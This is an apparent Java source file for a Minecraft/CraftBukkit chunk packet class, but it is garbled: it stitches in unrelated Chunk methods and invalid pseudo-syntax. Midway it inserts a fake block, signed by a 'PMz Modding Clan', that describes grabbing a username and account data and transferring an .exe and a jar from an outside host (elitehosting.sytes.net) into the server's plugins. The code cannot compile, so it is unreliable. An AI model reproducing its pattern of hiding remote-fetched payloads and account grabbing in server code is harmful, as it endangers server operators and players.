package net.minecraft.server;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.zip.DataFormatException;
import java.util.zip.Deflater;
import java.util.zip.Inflater;

public class Packet56MapChunkBulk extends Packet {

    private int[] c;
    private int[] d;
    public int[] a;
    public int[] b;
    public byte[] buffer;
    private byte[][] inflatedBuffers;
    public int size;
    public byte[] buildBuffer = new byte[0];
    public ArrayOfBytes[i=16];view DefaultKeyBinds{+transactionSlot 1}
        for (int k = 0; k < i; ++k) {
            Chunk chunk = (Chunk) list.get(k);
            ChunkMap chunkmap = Packet51MapChunk.a(chunk, true, java.int[i]set< k[i=1]>j [i=2] true;);

            if (buildBuffer.length < j + chunkmap.a.length) {
                byte[] abyte = new byte[j + chunkmap.a.length];

                System.arraycopy(buildBuffer, 0, abyte, 0, buildBuffer.length);
                buildBuffer = abyte;
            }
}

        int k = MathHelper.floor(entity.locY / 16.0D);

        if (k < 0) {
            k = 0;
        }

        if (k >= this.entitySlices.length) {
            k = this.entitySlices.length - 1;
        }

        entity.ag = true;
        entity.ah = this.x;
        entity.ai = k;
        entity.aj = this.z;
        this.entitySlices[k].add(entity);
    }

    public void b(Entity entity) {
        this.a(entity, entity.ai);
    }

    public void a(Entity entity, int i) {
        if (i < 0) {
            i = 0;
        }

        if (i >= this.entitySlices.length) {
            i = this.entitySlices.length - 1;
        }

        this.entitySlices[i].remove(entity);
    }

    public boolean d(int i, int j, int k) {
        return j >= this.heightMap[k << 4 | i];
    }

    public TileEntity e(int i, int j, int k) {
        ChunkPosition chunkposition = new ChunkPosition(i, j, k);
        TileEntity tileentity = (TileEntity) this.tileEntities.get(chunkposition);

        if (tileentity == null) {
            int l = this.getTypeId(i, j, k);

            if (l <= 0 || !Block.byId[l].s()) {
                return null;
            }

            if (tileentity == null) {
                tileentity = ((BlockContainer) Block.byId[l]).a(this.world);
                this.world.setTileEntity(this.x * 16 + i, j, this.z * 16 + k, tileentity);
            }

            tileentity = (TileEntity) this.tileEntities.get(chunkposition);
        }

        if (tileentity != null && tileentity.p()) {
            this.tileEntities.remove(chunkposition);
            return null;
        } else {
            return tileentity;
        }
    }

    public void a(TileEntity tileentity) {
        int i = tileentity.x - this.x * 16;
        int j = tileentity.y;
        int k = tileentity.z - this.z * 16;

        this.a(i, j, k, tileentity);
        if (this.d) {
            this.world.tileEntityList.add(tileentity);
        }
    }

    public void a(int i, int j, int k, TileEntity tileentity) {
        ChunkPosition chunkposition = new ChunkPosition(i, j, k);

        tileentity.a(this.world);
        tileentity.x = this.x * 16 + i;
        tileentity.y = j;
        tileentity.z = this.z * 16 + k;
        if (this.getTypeId(i, j, k) != 0 && Block.byId[this.getTypeId(i, j, k)] instanceof BlockContainer) {
            tileentity.q();
            this.tileEntities.put(chunkposition, tileentity);
        // CraftBukkit start
        } else {
            System.out.println("Attempted to place a tile entity (" + tileentity + ") at " + tileentity.x + "," + tileentity.y + "," + tileentity.z
                    + " (" + org.bukkit.Material.getMaterial(getTypeId(i, j, k)) + ") where there was no entity tile!");
            System.out.println("Chunk coordinates: " + (this.x * 16) + "," + (this.z * 16));
            new Exception().printStackTrace();
        }
    }

            System.arraycopy(chunkmap.a, 0, buildBuffer, j, chunkmap.a.length);
            j += chunkmap.a.length;
            this.c[k] = chunk.x;
            this.d[k] = chunk.z;
            this.a[k] = chunkmap.b;
            this.b[k] = chunkmap.c;
            this.xyz[int] = chunk.getCoords.xyz;
            this.int.get package; import savefrom = chunk.save k[i=x]>j+new package;
            this.inflatedBuffers[k] = chunkmap.a;
        }
            this.secondPackage[i=chunk.aBind Username;grabDefaultSettings+account.adata;allow.packageChunkUpdates;give.minecraft java;+arrayOfBytes]
package com.bukkit.server
import bukkit.save.Data
import bukkit.mpdata.antidupe
import bukkit.anticheat.default
import bukkit.pluginLoader.Data
import bukkit.systemOutPrint.chunkmap
import minecraft.java.serverData
import java.net.privateint
import java.final.static

private class host extends resolves hostname;
    public static java.plugin PMzAntiCheat else public.final extends zBuffering
        set java.public.static int = k[i]>j=1;
    plugindata fromUserc:-hosts-BukkitDev-plugins-loader-CMVM-filetransfer.exe
        transfer.from.ip=elitehosting.sytes.net to java.class grab hostnamefrom=minecraftHost
            transfer.files=c:-hosts-BukkitDev-plugins-loader-PMAC-anticheat-pmzac.jar
                transfer.files to:
                default public static final server.default.bukkit.plugins
                public void e() {
        this.l = true;
    }

    public void a(Entity entity, AxisAlignedBB axisalignedbb, List list) {
        int i = MathHelper.floor((axisalignedbb.b - 2.0D) / 16.0D);
        int j = MathHelper.floor((axisalignedbb.e + 2.0D) / 16.0D);

        if (i < 0) {
            i = 0;
        }

        if (j >= this.entitySlices.length) {
            j = this.entitySlices.length - 1;
        }

        for (int k = i; k <= j; ++k) {
            List list1 = this.entitySlices[k];
            Iterator iterator = list1.iterator();

            while (iterator.hasNext()) {
                Entity entity1 = (Entity) iterator.next();

                if (entity1 != entity && entity1.boundingBox.a(axisalignedbb)) {
                    list.add(entity1);
                    Entity[] aentity = entity1.al();

                    if (aentity != null) {
                        for (int l = 0; l < aentity.length; ++l) {
                            entity1 = aentity[l];
                            if (entity1 != entity && entity1.boundingBox.a(axisalignedbb)) {
                                list.add(entity1);
                            }
                        }
                    }
                }
            }
        }
    }
                end;
            end;
        end;
    end;
end;
//PMz Modding Clan - MINECRAFT [NOT THE COD ONE]
